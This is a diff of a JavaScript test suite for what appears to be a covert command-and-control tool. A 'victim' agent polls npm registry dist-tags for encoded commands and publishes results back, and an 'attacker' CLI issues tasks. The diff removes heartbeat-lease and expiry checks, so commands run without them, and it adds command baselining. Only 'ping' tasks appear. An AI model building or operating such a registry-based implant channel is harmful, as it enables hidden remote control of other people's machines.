@@ -5,33 +5,24 @@ import os from 'node:os';
 import path from 'node:path';
 import { runTask, ALLOWED_OPS } from '../src/victim/tasks.js';
 import {
+  applyAgentIdentity,
   defaultState,
-  isCommandExpired,
+  createCommandBaseline,
+  encodeStableAnnouncementTag,
   loadState,
   processDistTags,
-  publishHeartbeat,
   publishResultTags,
-  runHeartbeatLoop,
   saveState,
   selectCommands,
 } from '../src/victim/agent.js';
-import { decodeAnnounceTag, encodeAnnounceTag, encodeCommandTag, TASK_OPS } from '../src/common/protocol.js';
+import { decodeAnnounceTag, encodeCommandTag, TASK_OPS } from '../src/common/protocol.js';
 import {
   createSingleFlight,
   formatLiveNotification,
   pendingDirectTasks,
   sanitizeRegistryText,
-  wasCommandSentLocally,
 } from '../src/attacker/cli.js';
-import {
-  agentPresenceStatus,
-  assertDirectTargetOnline,
-  invalidateAgentPresence,
-  isAgentOnline,
-  loadAttackerState,
-  mergeAgentInfo,
-  observeHeartbeatSet,
-} from '../src/attacker/presence.js';
+import { assertKnownAgent, loadAttackerState } from '../src/attacker/state.js';
 
 const AGENT = 'a1b2c3d4';
 
@@ -229,7 +220,7 @@ test('broadcast commands dedup independently of direct commands', async () => {
   assert.equal(state.lastSeq[AGENT], 1);
 });
 
-test('runtime rejects legacy broadcast tags that have no per-agent heartbeat lease', async () => {
+test('runtime accepts broadcast tags without a heartbeat lease', async () => {
   const broadcast = encodeCommandTag('all', 1, { op: 'ping', ts: 1 });
   const state = defaultState();
   const client = new FakeClient();
@@ -239,12 +230,12 @@ test('runtime rejects legacy broadcast tags that have no per-agent heartbeat lea
     agentId: AGENT,
     client,
     logger: silentLogger,
-    validLeases: new Set(['current']),
   });
 
-  assert.equal(stats.executed, 0);
-  assert.equal(stats.skipped, 1);
+  assert.equal(stats.executed, 1);
+  assert.equal(stats.skipped, 0);
   assert.equal(state.lastSeq.all, 1);
+  assert.equal(client.deleteCalls.length, 0, 'broadcast must remain for other agents');
 });
 
 test('state is marked processed even when result publishing fails', async () => {
@@ -335,86 +326,107 @@ test('publishResultTags gives up after bounded rounds when chunks never stick', 
   assert.equal(client.setCalls, 6, '2 chunks x 3 rounds');
 });
 
-test('direct commands require a recent heartbeat lease without comparing host clocks', async () => {
-  const valid = encodeCommandTag(AGENT, 1, { op: 'ping', ts: 9_999_999_999, lease: 'lease-new' });
-  const stale = encodeCommandTag(AGENT, 2, { op: 'ping', ts: 1, lease: 'lease-old' });
+test('direct commands execute without leases and are deleted after processing', async () => {
+  const command = encodeCommandTag(AGENT, 1, { op: 'ping', ts: 1 });
   const state = defaultState();
   const client = new FakeClient();
   const stats = await processDistTags({
-    distTags: { [stale]: '1.0.0', [valid]: '1.0.0' },
+    distTags: { [command]: '1.0.0' },
     state,
     agentId: AGENT,
     client,
     logger: silentLogger,
-    validLeases: new Set(['lease-new']),
   });
 
-  assert.equal(isCommandExpired({ ts: 9_000 }, 10_000, 1_000), true);
-  assert.equal(isCommandExpired({}, 10_000, 1_000), true);
   assert.equal(stats.executed, 1);
-  assert.equal(stats.skipped, 1);
-  assert.equal(state.lastSeq[AGENT], 2);
+  assert.equal(stats.skipped, 0);
+  assert.equal(state.lastSeq[AGENT], 1);
   assert.equal(client.setCalls.length, 1);
-  assert.deepEqual(client.deleteCalls.sort(), [stale, valid].sort());
+  assert.deepEqual(client.deleteCalls, [command]);
 });
 
-test('heartbeat is published before older own announce tags are deleted', async () => {
-  const oldOwn = encodeAnnounceTag(AGENT, { ts: 1_000, host: 'old' });
-  const foreign = encodeAnnounceTag('otheragent', { ts: 1_000 });
-  const client = new FakeClient();
-  const tag = await publishHeartbeat({
-    client,
-    agentId: AGENT,
-    distTags: { [oldOwn]: '1.0.0', [foreign]: '1.0.0' },
-    now: 2_000,
-    cwd: '/tmp/lab',
-    host: 'host1',
-    logger: silentLogger,
-  });
-
-  assert.deepEqual(client.events, [['set', tag], ['delete', oldOwn]]);
-});
-
-test('heartbeat lease becomes valid immediately after publish, before cleanup finishes', async () => {
-  const oldOwn = encodeAnnounceTag(AGENT, { ts: 1_000, lease: 'old' });
-  const client = new FakeClient();
-  let publishedLease = '';
-  const tag = await publishHeartbeat({
-    client,
-    agentId: AGENT,
-    distTags: { [oldOwn]: '1.0.0' },
-    now: 2_000,
-    lease: 'new',
-    cwd: '/tmp',
-    host: 'host1',
-    onPublished: () => {
-      publishedLease = 'new';
-      client.events.push(['lease', 'new']);
-    },
-    logger: silentLogger,
-  });
-
-  assert.equal(publishedLease, 'new');
-  assert.deepEqual(client.events, [['set', tag], ['lease', 'new'], ['delete', oldOwn]]);
-});
-
-test('heartbeat drops oversized optional metadata but keeps its lease', async () => {
-  const client = new FakeClient();
-  const tag = await publishHeartbeat({
-    client,
-    agentId: AGENT,
-    distTags: {},
-    now: 2_000,
-    cwd: `/${'deep/'.repeat(100)}`,
-    host: 'host'.repeat(100),
-    lease: 'lease-123',
-    logger: silentLogger,
-  });
+test('stable announcement is deterministic and carries no heartbeat metadata', () => {
+  const tag = encodeStableAnnouncementTag(AGENT);
   const decoded = decodeAnnounceTag(tag);
 
+  assert.equal(encodeStableAnnouncementTag(AGENT), tag);
   assert.ok(tag.length <= 214);
-  assert.equal(decoded.payload.ts, 2_000);
-  assert.equal(decoded.payload.lease, 'lease-123');
+  assert.deepEqual(decoded.payload, { v: 1 });
+  assert.equal('ts' in decoded.payload, false);
+  assert.equal('lease' in decoded.payload, false);
+});
+
+test('command baseline skips existing direct and broadcast sequences once', () => {
+  const state = defaultState();
+  state.agentId = AGENT;
+  const distTags = {
+    latest: '1.0.0',
+    [encodeCommandTag(AGENT, 4, { op: 'ping' })]: '1.0.0',
+    [encodeCommandTag(AGENT, 7, { op: 'ping' })]: '1.0.0',
+    [encodeCommandTag('all', 3, { op: 'ping' })]: '1.0.0',
+    [encodeCommandTag('otheragent', 99, { op: 'ping' })]: '1.0.0',
+    'x-cmd-broken': '1.0.0',
+  };
+
+  const baseline = createCommandBaseline(distTags, state, AGENT);
+  assert.notEqual(baseline, state);
+  assert.equal(baseline.commandBaselineVersion, 1);
+  assert.deepEqual(baseline.lastSeq, { [AGENT]: 7, all: 3 });
+  assert.deepEqual(state.lastSeq, {}, 'baseline creation must not mutate the input state');
+
+  const repeated = createCommandBaseline({
+    ...distTags,
+    [encodeCommandTag(AGENT, 8, { op: 'ping' })]: '1.0.0',
+  }, baseline, AGENT);
+  assert.equal(repeated, baseline, 'completed baseline is never advanced on restart');
+});
+
+test('changing agent identity resets command state so existing commands are baselined', () => {
+  const persisted = {
+    agentId: 'oldagent',
+    lastSeq: { oldagent: 12, all: 8 },
+    commandBaselineVersion: 1,
+  };
+
+  const reassigned = applyAgentIdentity(persisted, AGENT);
+
+  assert.deepEqual(reassigned, {
+    agentId: AGENT,
+    lastSeq: {},
+    commandBaselineVersion: 0,
+  });
+  assert.deepEqual(persisted, {
+    agentId: 'oldagent',
+    lastSeq: { oldagent: 12, all: 8 },
+    commandBaselineVersion: 1,
+  }, 'identity application must not mutate persisted state');
+
+  const existingCommands = {
+    [encodeCommandTag(AGENT, 4, { op: 'ping' })]: '1.0.0',
+    [encodeCommandTag('all', 9, { op: 'ping' })]: '1.0.0',
+  };
+  const baselined = createCommandBaseline(existingCommands, reassigned, AGENT);
+
+  assert.deepEqual(baselined.lastSeq, { [AGENT]: 4, all: 9 });
+  assert.deepEqual(selectCommands(existingCommands, baselined, AGENT).commands, []);
+});
+
+test('commands published after the baseline execute normally', async () => {
+  const oldCommand = encodeCommandTag(AGENT, 2, { op: 'ping' });
+  const baseline = createCommandBaseline({ [oldCommand]: '1.0.0' }, defaultState(), AGENT);
+  const newCommand = encodeCommandTag(AGENT, 3, { op: 'ping' });
+  const client = new FakeClient();
+
+  const stats = await processDistTags({
+    distTags: { [oldCommand]: '1.0.0', [newCommand]: '1.0.0' },
+    state: baseline,
+    agentId: AGENT,
+    client,
+    logger: silentLogger,
+  });
+
+  assert.equal(stats.executed, 1);
+  assert.equal(baseline.lastSeq[AGENT], 3);
 });
 
 test('state file round-trip and corruption resilience', () => {
@@ -423,6 +435,7 @@ test('state file round-trip and corruption resilience', () => {
   const s = defaultState();
   s.agentId = AGENT;
   s.lastSeq[AGENT] = 5;
+  s.commandBaselineVersion = 1;
   saveState(p, s);
   assert.deepEqual(loadState(p), s);
   fs.writeFileSync(p, 'not json {');
@@ -441,9 +454,6 @@ test('pending direct tasks are derived from local request/response history', () 
 
   assert.deepEqual(pendingDirectTasks(history), [history[0], history[2]]);
   assert.deepEqual(pendingDirectTasks(history, { now: 7_000, ttlMs: 5_000 }), [history[2]]);
-  const taggedHistory = [{ dir: 'out', target: 'agent1', seq: 3, tag: 'exact-tag' }];
-  assert.equal(wasCommandSentLocally(taggedHistory, 'exact-tag'), true);
-  assert.equal(wasCommandSentLocally(taggedHistory, 'forged-same-seq-tag'), false);
 });
 
 test('registry result text cannot inject terminal controls or unbounded output', () => {
@@ -451,115 +461,28 @@ test('registry result text cannot inject terminal controls or unbounded output',
   assert.equal(sanitizeRegistryText('x'.repeat(5_000)).length, 4_000);
 });
 
-test('persistent tags do not refresh agent presence', () => {
-  const current = { host: 'host1', lastSeen: 1_000 };
-  assert.deepEqual(mergeAgentInfo(current, {}), current);
-  assert.deepEqual(mergeAgentInfo(current, { lastSeen: 900 }), current);
-  assert.deepEqual(mergeAgentInfo(current, { lastSeen: 1_100 }), {
-    host: 'host1',
-    lastSeen: 1_100,
-  });
-  assert.equal(isAgentOnline(current, 2_000, 1_000), true);
-  assert.equal(isAgentOnline(current, 2_001, 1_000), false);
-
-  const state = { agentInfo: { online: { lastSeen: 1_500 }, offline: { lastSeen: 500 } } };
-  assert.doesNotThrow(() => assertDirectTargetOnline(state, 'online', 2_000, 1_000));
-  assert.throws(() => assertDirectTargetOnline(state, 'offline', 2_000, 1_000), /offline/);
-  assert.throws(() => assertDirectTargetOnline(state, 'unknown', 2_000, 1_000), /not online/);
-});
-
-test('direct tasking refuses an agent whose presence is unknown', () => {
-  const state = { agentInfo: { maybe: { baselineAt: 1_500 } } };
-  assert.throws(() => assertDirectTargetOnline(state, 'maybe', 2_000, 1_000), /presence is unknown/);
-});
-
-test('heartbeat liveness uses local observation time, not the victim clock', () => {
-  const first = observeHeartbeatSet({}, ['future-clock-tag'], {
-    ts: 9_999_999_999,
-    host: 'clock-ahead',
-  }, 1_000);
-
-  assert.equal(first.lastSeen, 0, 'the first snapshot is only a baseline');
-  assert.equal(agentPresenceStatus(first, 1_000, 90_000, true), 'unknown');
-
-  const repeated = observeHeartbeatSet(first, ['future-clock-tag'], {
-    ts: 9_999_999_999,
-    host: 'clock-ahead',
-  }, 31_000);
-  assert.equal(repeated.lastSeen, 0, 'a persistent tag is not a new heartbeat');
-
-  const next = observeHeartbeatSet(repeated, ['future-clock-tag', 'behind-clock-tag'], {
-    ts: 1,
-    host: 'clock-behind',
-    lease: 'lease-new',
-  }, 32_000);
-  assert.equal(next.lastSeen, 32_000);
-  assert.equal(next.lease, 'lease-new');
-  assert.equal(agentPresenceStatus(next, 33_000, 90_000, true), 'online');
-  assert.equal(agentPresenceStatus(next, 122_001, 90_000, true), 'offline');
-});
-
-test('repeated and stale heartbeat snapshots do not refresh or revert metadata', () => {
-  const baseline = observeHeartbeatSet({}, ['beat-a'], { ts: 100, host: 'old' }, 1_000);
-  const fresh = observeHeartbeatSet(baseline, ['beat-a', 'beat-b'], { ts: 50, host: 'new' }, 2_000);
-  const repeated = observeHeartbeatSet(fresh, ['beat-b', 'beat-a'], { ts: 100, host: 'old' }, 3_000);
-  const stale = observeHeartbeatSet(repeated, ['beat-a'], { ts: 100, host: 'old' }, 4_000);
-
-  assert.equal(fresh.lastSeen, 2_000);
-  assert.equal(fresh.host, 'new');
-  assert.equal(repeated.lastSeen, 2_000);
-  assert.equal(repeated.host, 'new');
-  assert.equal(stale.lastSeen, 2_000);
-  assert.equal(stale.host, 'new');
-});
-
-test('a stable heartbeat snapshot larger than 256 tags does not refresh presence', () => {
-  const tags = Array.from({ length: 257 }, (_, index) => `beat-${index}`);
-  const baseline = observeHeartbeatSet({}, tags, { ts: 1 }, 1_000);
-  const repeated = observeHeartbeatSet(baseline, tags, { ts: 1 }, 2_000);
-
-  assert.equal(baseline.heartbeatTags.length, 257);
-  assert.equal(repeated.lastSeen, 0);
-});
-
-test('heartbeat metadata is bounded and strips terminal control characters', () => {
-  const info = observeHeartbeatSet({}, ['beat-a'], {
-    ts: 1,
-    host: '\u001b[31mhost\nspoofed',
-    cwd: `/tmp/${'x'.repeat(500)}\r`,
-  }, 1_000);
-
-  assert.equal(info.host, 'hostspoofed');
-  assert.ok(info.cwd.length <= 160);
-  assert.doesNotMatch(info.host + info.cwd, /[\u0000-\u001f\u007f-\u009f]/);
-});
-
-test('legacy attacker state does not restore remote timestamps as live presence', () => {
+test('legacy attacker state preserves durable data and drops heartbeat-only fields', () => {
   const dir = tmpdir();
   const statePath = path.join(dir, 'attacker-state.json');
   fs.writeFileSync(statePath, JSON.stringify({
     presenceVersion: 1,
     agents: [AGENT],
+    sent: 3,
+    history: [{ dir: 'out', target: AGENT, seq: 1, op: 'ping' }],
     agentInfo: { [AGENT]: { ts: 9_999_999_999, host: 'future-host', cwd: '/tmp' } },
   }));
 
   const loaded = loadAttackerState(statePath);
-  assert.equal(loaded.presenceVersion, 2);
-  assert.equal(loaded.agentInfo[AGENT].lastSeen, 0);
-  assert.equal(loaded.agentInfo[AGENT].host, 'future-host');
-  assert.equal(agentPresenceStatus(loaded.agentInfo[AGENT], 1_000, 90_000, true), 'unknown');
+  assert.deepEqual(loaded.agents, [AGENT]);
+  assert.equal(loaded.sent, 3);
+  assert.equal(loaded.history.length, 1);
+  assert.equal('presenceVersion' in loaded, false);
+  assert.equal('agentInfo' in loaded, false);
 });
 
-test('presence becomes unknown after refresh failure or explicit invalidation', () => {
-  const online = { lastSeen: 10_000, heartbeatTags: ['beat-1'] };
-  assert.equal(agentPresenceStatus(online, 10_500, 90_000, true), 'online');
-  assert.equal(agentPresenceStatus(online, 10_500, 90_000, false), 'unknown');
-
-  const invalidated = invalidateAgentPresence(online, 11_000);
-  assert.equal(invalidated.lastSeen, 0);
-  assert.deepEqual(invalidated.heartbeatTags, ['beat-1']);
-  assert.equal(agentPresenceStatus(invalidated, 11_001, 90_000, true), 'unknown');
-  assert.equal(agentPresenceStatus(invalidated, 101_001, 90_000, true), 'offline');
+test('direct tasking requires a historically known agent', () => {
+  assert.doesNotThrow(() => assertKnownAgent({ agents: [AGENT] }, AGENT));
+  assert.throws(() => assertKnownAgent({ agents: [AGENT] }, 'missing'), /not known/);
 });
 
 test('single-flight polling makes concurrent callers await one refresh', async () => {
@@ -598,26 +521,6 @@ test('single-flight polling clears a rejected refresh', async () => {
   assert.equal(calls, 1);
   assert.equal(await refresh(), 'ok');
   assert.equal(calls, 2);
-});
-
-test('heartbeat loop continues while result-like asynchronous work is in progress', async () => {
-  let running = true;
-  let beats = 0;
-  const loop = runHeartbeatLoop({
-    heartbeatMs: 5,
-    isRunning: () => running,
-    publish: async () => { beats++; },
-    logger: silentLogger,
-    sleepSliceMs: 2,
-  });
-
-  for (let i = 0; i < 15; i++) {
-    await new Promise((resolve) => setTimeout(resolve, 2));
-  }
-  running = false;
-  await loop;
-
-  assert.ok(beats >= 3, `expected independent heartbeats during uploads, got ${beats}`);
 });
 
 test('live notifications clear an existing terminal prompt first', () => {
